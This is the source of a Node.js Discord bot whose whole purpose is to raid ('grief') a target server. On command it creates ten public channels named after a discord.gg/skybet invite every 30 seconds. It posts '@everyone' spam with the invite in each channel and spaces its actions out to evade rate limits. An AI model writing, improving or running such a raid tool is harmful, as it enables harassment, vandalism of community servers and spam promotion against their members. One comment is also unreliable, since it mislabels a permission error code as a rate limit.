const { Client, GatewayIntentBits, PermissionFlagsBits } = require('discord.js');
require('dotenv').config();

// Fix for ReadableStream undefined error
if (typeof ReadableStream === 'undefined') {
  global.ReadableStream = require('stream/web').ReadableStream;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Bot configuration from environment variables
const config = {
  token: process.env.DISCORD_TOKEN,
  targetServerId: process.env.TARGET_SERVER_ID,
  channelName: 'discord.gg/skybet',
  messageContent: '@everyone discord.gg/skybet',
  command: '.lolgg'
};

// Track if the griefing process is active
let isGriefing = false;
let griefingInterval;

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  console.log('Bot is ready to execute commands');
});

client.on('messageCreate', async message => {
  // Check if the message is the command to start griefing
  if (message.content === config.command && !isGriefing) {
    // Check if the user has admin permissions
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = true;
    message.channel.send('Starting continuous griefing process...');
    
    // Get the target server
    const guild = client.guilds.cache.get(config.targetServerId) || message.guild;
    
    if (!guild) {
      message.channel.send('Could not find the target server.');
      isGriefing = false;
      return;
    }
    
    // Start the continuous griefing process
    startContinuousGriefing(guild);
  }
  
  // Command to stop griefing
  if (message.content === '.stop' && isGriefing) {
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply('You need administrator permissions to use this command.');
    }
    
    isGriefing = false;
    clearInterval(griefingInterval);
    message.channel.send('Griefing process stopped.');
  }
});

function startContinuousGriefing(guild) {
  // Create channels immediately
  createChannelsAndSpam(guild);
  
  // Then set up interval to create more channels continuously
  griefingInterval = setInterval(() => {
    if (isGriefing) {
      createChannelsAndSpam(guild);
    }
  }, 30000); // Create new batch of channels every 30 seconds
}

async function createChannelsAndSpam(guild) {
  const channelsToCreate = 10; // Reduced from 50 to 10 channels each batch
  
  for (let i = 0; i < channelsToCreate; i++) {
    try {
      // Create a new text channel
      const channel = await guild.channels.create({
        name: `${config.channelName}-${Date.now()}-${Math.random().toString(36).substring(7)}`,
        type: 0, // Text channel
        permissionOverwrites: [
          {
            id: guild.id,
            allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages]
          }
        ]
      });
      
      // Send multiple spam messages to the channel
      for (let j = 0; j < 5; j++) { // Reduced from 10 to 5 messages
        await channel.send(config.messageContent);
        // Increased delay between messages to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
      console.log(`Created channel: ${channel.name}`);
    } catch (error) {
      console.error(`Failed to create channel:`, error);
      // If we hit rate limits, wait longer before trying again
      if (error.code === 50013) { // Rate limit error code
        await new Promise(resolve => setTimeout(resolve, 10000));
      }
    }
    
    // Increased delay between channel creations to avoid rate limiting
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
  
  console.log(`Batch of ${channelsToCreate} channels created with spam messages`);
}

// Login to Discord with your bot token
client.login(config.token);
